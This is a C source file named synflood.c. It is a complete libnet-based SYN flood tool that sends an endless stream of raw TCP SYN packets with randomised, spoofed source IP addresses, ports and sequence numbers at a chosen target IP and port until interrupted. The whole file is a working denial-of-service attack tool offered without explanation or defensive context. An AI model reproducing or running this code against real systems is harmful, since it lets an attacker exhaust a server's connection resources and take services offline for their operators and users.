/*
 * ------------------------------------------------------------------------
 *   File Name: synflood.c
 *      Author: Zhao Yanbai
 *              Mon Mar 19 11:06:33 2012
 * Description: none
 * ------------------------------------------------------------------------
 */

#include <stdio.h>
#include <getopt.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <libnet.h>
void usage(const char *name) {
    printf("USAGE: %s [-i iface] [-t target ip] [-p target port]\n", name);
    printf(" -i, --iface <iface>           use this network interface\n");
    printf(" -t, --target <target ip>      target ip address\n");
    printf(" -p, --port <target port>      target port\n");
    printf(" -h, --help                    this help information\n");
}

int terminated = 0;
void sig_int(int signo) {
    terminated = 1;
}

int main(int argc, char *argv[]) {
    int ret;
    uint16_t    dst_port = 0;
    uint32_t    dst_ip;
    char    *iface = NULL;
    char    *target = NULL;

    struct option options[] = {
        {"iface",       optional_argument,      NULL,       'i'},
        {"target",      required_argument,      NULL,       't'},
        {"port",        required_argument,      NULL,       'p'},
        {"help",        no_argument,            NULL,       'h'},
        {0,             0,                      0,          0}
    };

    while((ret = getopt_long(argc, argv, "i:t:p:h", options, NULL)) != -1) {
        switch(ret) {
        case 'i':
            iface = optarg;
            break;
        case 't':
            target = optarg;
            break;
        case 'p':
            dst_port = (uint16_t) atoi(optarg);
            break;
        case 'h':
            usage(argv[0]);
            exit(EXIT_SUCCESS);
            break;
        default:
            break;
        }
    }


    if(target == NULL || dst_port == 0) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }


    printf("iface: %s \t target: %s port: %d \n", iface, target, dst_port);

    

    libnet_t *l = NULL;
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t t;
    int c;


    signal(SIGINT, sig_int);

    while(!terminated) {
        l = libnet_init(
                LIBNET_RAW4,
                iface,
                errbuf);
    
        if(l == NULL) {
            fprintf(stderr, "libnet_init() failed: %s", errbuf);
            exit(EXIT_FAILURE);
        }

        if((dst_ip = libnet_name2addr4(l, target, 1)) == -1) {
            fprintf(stderr, "bad IP address: %s\n", target);
            exit(EXIT_FAILURE);
        }
        t = libnet_build_tcp(
            libnet_get_prand(LIBNET_PRu16),     // src port
            dst_port,                           // dst port
            libnet_get_prand(LIBNET_PRu32),     // sequence number
            libnet_get_prand(LIBNET_PRu32),     // ACK sequence number
            TH_SYN,                             // 
            libnet_get_prand(LIBNET_PRu32),     // window size
            0,                                  // checksum
            0,                                  // urgent pointer
            LIBNET_TCP_H,                       // head sizea
            NULL,                               // payload
            0,                                  // payload length
            l,                                  // handler
            0);                                 // ptag

        if(t == -1) {
            fprintf(stderr, "Can't build TCP header: %s\n", libnet_geterror(l));
            terminated = 1;
            goto destroy;
        }


        t = libnet_build_ipv4(
            LIBNET_TCP_H+LIBNET_IPV4_H,         // ip len
            0,                                  // TOS
            libnet_get_prand(LIBNET_PRu16),     // IP identification number
            0,                                  // fragmentation bits and offset
            libnet_get_prand(LIBNET_PR8),       // TTL
            IPPROTO_TCP,                        // upper layer protocol
            0,                                  // checksum
            libnet_get_prand(LIBNET_PRu32),     // src IP
            dst_ip,                             // dst IP
            NULL,                               // option payload or NULL
            0,                                  // payload length or 0
            l,                                  // handler
            0);                                 // ptag


        if(t == -1) {
            fprintf(stderr, "Can't build IP header: %s\n", libnet_geterror(l));
            terminated = 1;
            goto destroy;
        }


        c = libnet_write(l);
        if(c == -1) {
            fprintf(stderr, "libnet_write: %s\n", libnet_geterror(l));
        }

destroy:
        libnet_destroy(l);
    }


    return 0;
}
